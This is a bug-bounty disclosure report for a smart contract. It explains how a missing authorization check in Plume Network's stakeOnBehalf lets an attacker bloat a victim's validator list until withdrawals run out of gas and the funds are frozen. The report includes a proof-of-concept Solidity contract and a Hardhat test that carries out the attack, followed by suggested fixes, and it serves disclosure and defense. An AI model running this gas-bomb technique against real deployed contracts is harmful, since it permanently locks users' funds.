# 51860 sc high missing access control in stakeonbehalf lets anyone bloat another user s validator list leading to permanent fund lock via gas exhaustion dos

**Submitted on Aug 6th 2025 at 10:01:07 UTC by @manvi for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #51860
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/StakingFacet.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Unbounded gas consumption

## Description

### Brief/Intro

The `stakeOnBehalf(uint16 validatorId, address staker)` function in `StakingFacet.sol` lacks any access control, allowing an attacker to repeatedly push tiny stakes on behalf of an arbitrary victim address. Each call appends a new entry to the victim’s internal `userValidators[]` array; later, any call by the victim to withdraw, restake, or unstake loops over that now-bloated array until it runs out of gas and reverts—permanently locking the victim’s funds on mainnet.

### Vulnerability Details

The function `stakeOnBehalf(uint16 validatorId, address staker)` is missing authorization.

```solidity
function stakeOnBehalf(uint16 validatorId, address staker) external payable returns (uint256) {
    // no check that msg.sender == staker or is approved
    uint256 stakeAmount = msg.value;
    _performStakeSetup(staker, validatorId, stakeAmount);
    emit Staked(staker, validatorId, stakeAmount, 0, 0, stakeAmount);
    emit StakedOnBehalf(msg.sender, staker, validatorId, stakeAmount);
    return stakeAmount;
}
```

Any external account can call this and credit any staker address with a new stake. There is no signature requirement or whitelist restricting who may stake on behalf of whom.

Unbounded growth of the victim’s validator list:

Inside `_performStakeSetup`, every new “on-behalf” stake calls:

`PlumeValidatorLogic.addStakerToValidator($, staker, validatorId);`

This function appends `validatorId` to the dynamic array `userValidators[staker]` whenever it’s not already present. An attacker can repeat calls (using distinct `validatorId` values) to make `userValidators[victim]` arbitrarily large, at a very low cost for entry.

Core user operations traverse all entries in `userValidators[msg.sender]`. Once `ids.length` multiplied by per-iteration gas exceeds the block limit, every call to `withdraw()`, `restake()`, `unstake()` etc will run out of gas before doing any state change and the victim can never clear or shrink that array.

### Impact Details

{% stepper %}
{% step %}

### Permanent freezing of funds

An attacker can permanently freeze all staked funds for the victim address. No on-chain recourse without a protocol upgrade or migration.
{% endstep %}

{% step %}

### Unauthenticated abuse

The attack is unauthenticated: no prior deposits, approvals, or victim interaction are required to bloat their `userValidators` array.
{% endstep %}

{% step %}

### Funds locked for core user operations

Locked state affects withdraw, restake, unstake, and reward restake because these functions iterate the bloated array and will OOG (out-of-gas) before making progress.
{% endstep %}

{% step %}

### Irrecoverable without protocol change

Because the victim cannot successfully call the functions that would clear or restore their state, funds cannot be recovered without a protocol upgrade or emergency migration.
{% endstep %}
{% endstepper %}

### References

* Contract source: `contracts/facets/StakingFacet.sol` (lines implementing `stakeOnBehalf` and the loops in `_processMaturedCooldowns` / `withdraw`)
* Diamond Standard (EIP-2535): <https://eips.ethereum.org/EIPS/eip-2535>
* Gas-bomb DoS discussions: <https://blog.openzeppelin.com/stop-using-solidity-dynamic-arrays/>

## Proof of Concept

<details>

<summary>Minimal PoC demonstrating the gas-bomb DoS (expand to view contract and tests)</summary>

PoC Solidity contract (saved as `PoCStakingFacet.sol` in the PoC):

```solidity
pragma solidity ^0.8.25;

contract PoCStakingFacet {
    // mirrored the real userValidators and stakeInfo.parked
    mapping(address => uint16[]) public userValidators;
    mapping(address => uint256) public parked;
    uint256 public minStakeAmount = 1;

    // --- Vulnerable entry point is here ---
    function stakeOnBehalf(uint16 validatorId, address staker) external payable {
        require(msg.value >= minStakeAmount, "Too little");
        // NO auth check here
        // append to staker’s validator array
        userValidators[staker].push(validatorId);
        // immediately park the ETH so withdraw has something to send
        parked[staker] += msg.value;
    }

    // --- Gas-bomb withdrawal ---
    function withdraw() external {
        // emulate real _processMaturedCooldowns loop
        uint16[] memory ids = userValidators[msg.sender];
        for (uint256 i = 0; i < ids.length; i++) {
            // no-op
        }
        uint256 amount = parked[msg.sender];
        require(amount > 0, "Nothing to withdraw");
        parked[msg.sender] = 0;
        // send back everything
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {}
}
```

PoC test (saved as `poc.test.js` under `test`):

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("StakingFacet gas-bomb DoS PoC", function () {
  let facet, attacker, victim;

  beforeEach(async () => {
    [attacker, victim] = await ethers.getSigners();
    const F = await ethers.getContractFactory("PoCStakingFacet");
    facet = await F.deploy();
    await facet.deployed();

    // Funding the facet so withdraw has a balance to send back
    await attacker.sendTransaction({
      to: facet.address,
      value: ethers.utils.parseEther("1"),
    });
  });

  it("locks victim when validator list is bloated", async () => {
    // attacker bloats victim’s list with 20k entries
    for (let i = 0; i < 20000; i++) {
      await facet
        .connect(attacker)
        .stakeOnBehalf(i, victim.address, { value: 1 });
    }

    // victim’s withdraw now iterates 20k times -> OOG-> revert
    await expect(facet.connect(victim).withdraw()).to.be.reverted;
  });

  it("still works when list is small", async () => {
    for (let i = 0; i < 10; i++) {
      await facet
        .connect(attacker)
        .stakeOnBehalf(i, victim.address, { value: 1 });
    }
    // withdraw succeeds, sending back ~1 ETH parked by beforeEach
    await expect(() =>
      facet.connect(victim).withdraw()
    ).to.changeEtherBalance(victim, ethers.utils.parseEther("1"));
  });
});
```

Observations from the PoC:

* The first test reproduces an out-of-gas revert on `withdraw()`, demonstrating the permanent DoS.
* The second test shows normal behavior when the victim’s list is small.

</details>

## Mitigation / Suggested Fixes (not added by reporter)

* Require authorization on `stakeOnBehalf`:
  * Allow only the staker or an approved actor (e.g., via signature-based permit, allowance, or an explicit approval mapping) to call `stakeOnBehalf` for a given staker.
  * Alternatively, restrict `stakeOnBehalf` to whitelisted contracts or roles that are explicitly trusted.
* Avoid unbounded user-supplied dynamic arrays as the sole source of truth for iterating critical operations. Consider:
  * Storing mappings for O(1) checks and operations and avoid iterating the entire user-provided list on critical user flows.
  * Using pagination/limits or off-chain indexing with on-chain checkpoints to prevent single-call iteration over unbounded arrays.
* Add defensive checks to withdraw/restake/unstake flows to avoid gas exhaustion (e.g., process only a bounded number of entries per transaction and allow continuation).
* Consider mechanisms to allow victims to prune malicious entries (e.g., a function that lets a user remove entries after proving ownership or via coordinated governance recovery) — though this may require careful access control design.

Note: Do not add any changes to the PoC or repository beyond the above recommendations in this report.
